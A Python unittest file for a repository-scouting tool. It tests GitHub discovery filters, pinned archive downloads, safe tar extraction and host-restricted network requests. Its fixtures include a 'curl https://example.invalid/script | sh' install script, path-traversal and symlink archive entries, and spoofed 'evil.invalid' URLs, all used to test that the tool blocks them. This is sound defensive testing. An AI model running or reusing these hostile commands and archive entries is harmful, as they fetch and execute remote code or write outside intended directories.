"""Offline coverage for public-source provenance, extraction and bounded requests."""
import gzip
import hashlib
import io
import json
from pathlib import Path
import sys
import tarfile
import tempfile
import threading
import unittest
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import scout_collect as collect

SHA = "a" * 40


def repository(name="sample/tool", repo_id=101, **changes):
    item = {
        "id": repo_id, "full_name": name, "private": False, "visibility": "public",
        "fork": False, "archived": False, "disabled": False,
        "owner": {"login": name.split("/")[0], "type": "Organization"},
        "license": {"spdx_id": "MIT", "name": "MIT License"},
        "description": "A useful public application", "stargazers_count": 2500,
        "pushed_at": "2099-01-01T00:00:00Z", "default_branch": "main",
        "language": "Python", "topics": ["llm"],
    }
    item.update(changes)
    return item


def archive(entries):
    raw = io.BytesIO()
    with tarfile.open(fileobj=raw, mode="w") as stream:
        for name, value in entries:
            item = tarfile.TarInfo(name)
            item.mode = 0o777
            if isinstance(value, bytes):
                item.size = len(value)
                stream.addfile(item, io.BytesIO(value))
            else:
                item.type = value[0]
                item.linkname = "/outside/secret"
                stream.addfile(item)
    return gzip.compress(raw.getvalue())


class FakeClient:
    def __init__(self, search=None, metadata=None, payload=None):
        self.search = search if search is not None else []
        self.metadata = metadata or repository()
        self.payload = payload or archive([("tool-a/README.md", b"# Example\n"), ("tool-a/main.py", b"print('source only')\n")])
        self.requests = []

    def fetch(self, url, **options):
        self.requests.append((url, options))
        if "search/repositories" in url:
            result = self.search(url) if callable(self.search) else {"items": self.search}
            if isinstance(result, Exception):
                raise result
        elif "/commits/" in url:
            result = {"sha": SHA, "commit": {"committer": {"date": "2026-01-01T00:00:00Z"}}}
        elif url.startswith("https://codeload.github.com/"):
            return self.payload
        else:
            result = self.metadata
        return json.dumps(result).encode()


class DiscoveryTest(unittest.TestCase):
    def test_deduplicates_history_and_categories(self):
        client = FakeClient(search=[repository(), repository("sample/new", 102), repository("sample/old", 103)])
        result = collect.discover_repositories(3, seen_repo_ids=[101], seen_full_names=["SAMPLE/OLD"], client=client)
        self.assertEqual([item["full_name"] for item in result["candidates"]], ["sample/new"])
        self.assertEqual(len(result["candidates"][0]["categories"]), 5)
        self.assertEqual(len(client.requests), 5)
        self.assertIn("不是日增 Star", result["strategy"])
        self.assertEqual(result["status"], "ok")

    def test_filters_excluded_or_unconfirmed_projects(self):
        items = [repository("sample/valid", 200)]
        for index, change in enumerate([
            {"fork": True}, {"archived": True}, {"private": True}, {"private": None},
            {"license": {"spdx_id": "NOASSERTION"}}, {"license": {"spdx_id": []}},
            {"pushed_at": "malformed"}, {"pushed_at": "2020-01-01T00:00:00Z"},
            {"stargazers_count": 3}, {"full_name": "sample/awesome-stuff"},
        ]):
            items.append(repository("sample/project" + str(index), index + 1, **change))
        result = collect.discover_repositories(10, client=FakeClient(search=items))
        self.assertEqual([item["full_name"] for item in result["candidates"]], ["sample/valid"])

    def test_all_sources_failed_is_not_an_empty_success(self):
        error = collect.ScoutError("rate_limited", "GitHub 暂时限制匿名请求。")
        result = collect.discover_repositories(client=FakeClient(search=lambda _: error))
        self.assertEqual(result["status"], "failed")
        self.assertEqual(len(result["failures"]), 5)
        self.assertEqual(result["sources"], [])

    def test_partial_sources_keep_real_results(self):
        calls = []
        def search(url):
            calls.append(url)
            if len(calls) == 1:
                return collect.ScoutError("network_error", "连接失败。")
            return {"items": [repository()]}
        result = collect.discover_repositories(client=FakeClient(search=search))
        self.assertEqual(result["status"], "partial")
        self.assertEqual(len(result["candidates"]), 1)
        self.assertEqual(len(result["failures"]), 1)

    def test_reserve_candidates_offer_distinct_bounded_fallbacks(self):
        client = FakeClient(search=[repository("sample/tool" + str(index), 100 + index, stargazers_count=10000-index) for index in range(15)])
        result = collect.discover_repositories(2, seen_repo_ids=[100], client=client)
        primary, reserve = result["candidates"], result["reserve_candidates"]
        self.assertEqual(len(primary), 2)
        self.assertEqual(len(reserve), 4)
        identities = [item["repo_id"] for item in primary + reserve]
        self.assertEqual(len(set(identities)), 6)
        self.assertNotIn(100, identities)
        self.assertGreaterEqual(primary[0]["stars"], reserve[0]["stars"])

    def test_cancel_and_invalid_config(self):
        event = threading.Event(); event.set()
        with self.assertRaises(collect.ScoutCancelled):
            collect.discover_repositories(cancel_event=event, client=FakeClient())
        for options in ({"limit": 0}, {"config": {"active_days": -1}}, {"config": [1]}):
            with self.assertRaises(collect.ScoutError):
                collect.discover_repositories(client=FakeClient(), **options)


class CollectionTest(unittest.TestCase):
    def setUp(self):
        self.temporary = tempfile.TemporaryDirectory()
        self.root = Path(self.temporary.name)

    def tearDown(self):
        self.temporary.cleanup()

    def test_pins_source_with_provenance_and_does_not_execute_it(self):
        marker = self.root / "must-not-exist"
        payload = archive([
            ("tool-a/README.md", b"# Hello\n<script>ignored text</script>\npassword='hidden-value'\n"),
            ("tool-a/main.py", ("from pathlib import Path\nPath(" + repr(str(marker)) + ").touch()\n").encode()),
            ("tool-a/install.sh", b"curl https://example.invalid/script | sh\n"),
        ])
        client, events = FakeClient(payload=payload), []
        result = collect.collect_repository({"full_name": "sample/tool", "repo_id": 101}, self.root / "source", client=client, progress=events.append)
        self.assertFalse(marker.exists())
        self.assertEqual(result["commit_sha"], SHA)
        self.assertEqual(result["archive_sha256"], hashlib.sha256(payload).hexdigest())
        self.assertEqual(result["source_url"], "https://codeload.github.com/sample/tool/tar.gz/" + SHA)
        self.assertEqual(result["file_count"], 3)
        self.assertEqual((self.root / "source" / "install.sh").read_bytes(), b"curl https://example.invalid/script | sh\n")
        self.assertNotIn("hidden-value", result["readme_excerpt"])
        self.assertNotIn("<script>", result["readme_excerpt"])
        self.assertEqual(result["scan"]["level"], "high")
        self.assertTrue(all("/blob/" + SHA + "/" in finding["url"] for finding in result["scan"]["findings"]))
        self.assertEqual([event["stage"] for event in events], ["metadata", "download", "extract", "scan"])
        self.assertFalse((self.root / "source" / "install.sh").stat().st_mode & 0o111)

    def test_changed_repository_identity_prevents_source_download(self):
        client = FakeClient()
        with self.assertRaises(collect.ScoutError) as caught:
            collect.collect_repository({"full_name": "sample/tool", "repo_id": 333}, self.root / "source", client=client)
        self.assertEqual(caught.exception.code, "repository_changed")
        self.assertEqual(len(client.requests), 1)

    def test_metadata_does_not_mutate_default_branch(self):
        client = FakeClient(metadata=repository(default_branch="feature/token=value"))
        collect.collect_repository("sample/tool", self.root / "source", client=client)
        self.assertIn("/commits/feature%2Ftoken%3Dvalue", client.requests[1][0])

    def test_missing_or_private_metadata_never_downloads_source(self):
        for index, value in enumerate((None, True)):
            client = FakeClient(metadata=repository(private=value))
            with self.assertRaises(collect.ScoutError):
                collect.collect_repository("sample/tool", self.root / str(index), client=client)
            self.assertEqual(len(client.requests), 1)

    def test_links_reserved_names_large_files_and_submodules_are_partial(self):
        payload = archive([
            ("tool-a/link", (tarfile.SYMTYPE,)), ("tool-a/hard", (tarfile.LNKTYPE,)),
            ("tool-a/pipe", (tarfile.FIFOTYPE,)), ("tool-a/CON.txt", b"skip"),
            ("tool-a/large", b"x" * 100), ("tool-a/.gitmodules", b"[submodule]\n"),
            ("tool-a/lfs", b"version https://git-lfs.github.com/spec/v1\noid abc"),
        ])
        with mock.patch.object(collect, "MAX_FILE_BYTES", 80):
            result = collect.collect_repository("sample/tool", self.root / "source", client=FakeClient(payload=payload))
        self.assertEqual(result["source_status"], "partial")
        self.assertEqual(result["file_count"], 2)
        self.assertEqual(result["extraction"]["skipped"], {
            "links_or_special_files": 3, "nonportable_path": 1, "file_size_limit": 1,
            "submodules_not_fetched": 1, "lfs_pointer_only": 1,
        })

    def test_unsafe_archives_reject_traversal_and_portability_collisions(self):
        cases = [
            [("../outside", b"bad")], [("root/../../outside", b"bad")],
            [("/absolute", b"bad")], [("root/a\\b", b"bad")], [("root/C:foo", b"bad")],
            [(".", (tarfile.DIRTYPE,))], [("source", b"bad")],
            [("first/a", b"1"), ("second/b", b"2")],
            [("root/A", b"1"), ("root/a", b"2")],
            [("root/Foo/a", b"1"), ("root/foo/b", b"2")],
            [("root/a", b"1"), ("root/a/b", b"2")],
            [("root/a", b"1"), ("root/a", b"2")],
        ]
        for index, entries in enumerate(cases):
            with self.subTest(entries=entries):
                destination = self.root / str(index); destination.mkdir()
                with self.assertRaises(collect.ScoutError) as caught:
                    collect.extract_source(archive(entries), destination)
                self.assertEqual(caught.exception.code, "unsafe_archive")
        self.assertFalse((self.root / "outside").exists())

    def test_decompression_and_file_limits_are_explicit(self):
        payload = archive([("root/a", b"a" * 1000)])
        with mock.patch.object(collect, "MAX_EXPANDED_BYTES", 100):
            with self.assertRaises(collect.ScoutError) as caught:
                collect.extract_source(payload, self.root)
            self.assertEqual(caught.exception.code, "archive_too_large")
        with self.assertRaises(collect.ScoutError) as caught:
            collect.extract_source(b"not a gzip file", self.root)
        self.assertEqual(caught.exception.code, "invalid_archive")
        with mock.patch.object(collect, "MAX_FILES", 1):
            result = collect.extract_source(archive([("root/a", b"1"), ("root/b", b"2")]), self.root)
        self.assertEqual(result["status"], "partial")
        self.assertEqual(result["skipped"], {"file_count_limit": 1})

    def test_refuses_nonempty_or_symlink_destination(self):
        (self.root / "existing").write_text("preserve")
        with self.assertRaises(collect.ScoutError):
            collect.extract_source(archive([("root/a", b"1")]), self.root)
        self.assertEqual((self.root / "existing").read_text(), "preserve")

    def test_windows_long_paths_are_partial_without_requiring_os_settings(self):
        relative = "nested/" + "x" * 175 + "/source.py"
        payload = archive([("root/README.md", b"read me"), ("root/" + relative, b"print('source')")])
        destination = self.root / ("d" * 50)
        destination.mkdir()
        with mock.patch.object(collect.sys, "platform", "win32"):
            result = collect.extract_source(payload, destination)
        self.assertEqual(result["status"], "partial")
        self.assertEqual(result["files"], ["README.md"])
        self.assertEqual(result["skipped"], {"windows_path_length_limit": 1})


class Response(io.BytesIO):
    def __init__(self, url, payload=b"{}", length=None, close_error=False):
        super().__init__(payload)
        self.url, self.headers, self.close_error = url, {}, close_error
        if length is not None:
            self.headers["Content-Length"] = str(length)

    def geturl(self):
        return self.url

    def __exit__(self, *args):
        super().__exit__(*args)
        if self.close_error:
            raise OSError("do not expose a secret from transport")


class Opener:
    def __init__(self, factory):
        self.factory, self.requests = factory, []

    def open(self, request, timeout):
        self.requests.append(request)
        return self.factory(request.full_url)


class TransportTest(unittest.TestCase):
    def test_archive_download_has_longer_deadline_without_delaying_cancellation(self):
        client = collect.PublicGitHubClient()
        self.assertEqual(client.deadline_for("https://api.github.com/repos/sample/tool"), 18)
        self.assertEqual(client.deadline_for("https://codeload.github.com/sample/tool/tar.gz/" + SHA), 60)
        gate, cancel = threading.Event(), threading.Event()
        def response(url):
            gate.wait(.08)
            return Response(url, b"source snapshot")
        client = collect.PublicGitHubClient(opener=Opener(response), request_deadline=.02, archive_deadline=.5)
        self.assertEqual(client.fetch("https://codeload.github.com/sample/tool/tar.gz/" + SHA), b"source snapshot")
        cancel.set()
        with self.assertRaises(collect.ScoutCancelled):
            client.fetch("https://codeload.github.com/sample/tool/tar.gz/" + SHA, cancel_event=cancel)

    def test_fixed_hosts_anonymous_get_and_size_limit(self):
        opener = Opener(lambda url: Response(url, b"12345"))
        client = collect.PublicGitHubClient(opener=opener)
        self.assertEqual(client.fetch("https://api.github.com/repos/sample/tool"), b"12345")
        request = opener.requests[0]
        self.assertEqual(request.get_method(), "GET")
        self.assertIsNone(request.data)
        self.assertNotIn("Authorization", request.headers)
        with self.assertRaises(collect.ScoutError) as caught:
            client.fetch("https://api.github.com/test", max_bytes=4)
        self.assertEqual(caught.exception.code, "response_too_large")
        for url in ("http://api.github.com/x", "https://evil.invalid", "https://api.github.com@evil.invalid/x", "https://user:pass@api.github.com/x", "https://api.github.com:8443/x", "https://api.github.com/x#secret"):
            with self.subTest(url=url), self.assertRaises(collect.ScoutError):
                client.fetch(url)
        self.assertEqual(len(opener.requests), 2)

    def test_redirect_and_declared_oversize_are_blocked(self):
        for response, expected in ((lambda _: Response("https://evil.invalid"), "redirect_blocked"),
                                   (lambda url: Response(url, length=500), "response_too_large")):
            with self.assertRaises(collect.ScoutError) as caught:
                collect.PublicGitHubClient(opener=Opener(response)).fetch("https://api.github.com/x", max_bytes=20)
            self.assertEqual(caught.exception.code, expected)

    def test_default_client_ignores_environment_proxy(self):
        with mock.patch.dict("os.environ", {"HTTPS_PROXY": "http://user:secret@invalid:8080"}):
            client = collect.PublicGitHubClient()
        self.assertFalse(any(getattr(handler, "proxies", {}) for handler in client.opener.handlers))
        self.assertTrue(any(isinstance(handler, collect._NoRedirect) for handler in client.opener.handlers))

    def test_cancellation_returns_without_waiting_for_blocked_network(self):
        gate, started, cancel = threading.Event(), threading.Event(), threading.Event()
        def response(url):
            started.set(); gate.wait(2)
            return Response(url)
        client = collect.PublicGitHubClient(opener=Opener(response), request_deadline=1)
        errors = []
        def run():
            try:
                client.fetch("https://codeload.github.com/sample/tool/tar.gz/" + SHA, cancel_event=cancel)
            except collect.ScoutError as error:
                errors.append(error.code)
        worker = threading.Thread(target=run); worker.start()
        try:
            self.assertTrue(started.wait(1)); cancel.set(); worker.join(.5)
            self.assertFalse(worker.is_alive())
            self.assertEqual(errors, ["cancelled"])
        finally:
            gate.set(); worker.join(2)

    def test_deadline_and_close_errors_are_sanitized(self):
        gate = threading.Event()
        def response(url):
            gate.wait(1)
            return Response(url)
        try:
            with self.assertRaises(collect.ScoutError) as caught:
                collect.PublicGitHubClient(opener=Opener(response), request_deadline=.03).fetch("https://api.github.com/x")
            self.assertEqual(caught.exception.code, "network_timeout")
        finally:
            gate.set()
        opener = Opener(lambda url: Response(url, close_error=True))
        with self.assertRaises(collect.ScoutError) as caught:
            collect.PublicGitHubClient(opener=opener).fetch("https://api.github.com/x")
        self.assertEqual(caught.exception.code, "network_error")
        self.assertNotIn("secret", str(caught.exception))


if __name__ == "__main__":
    unittest.main()
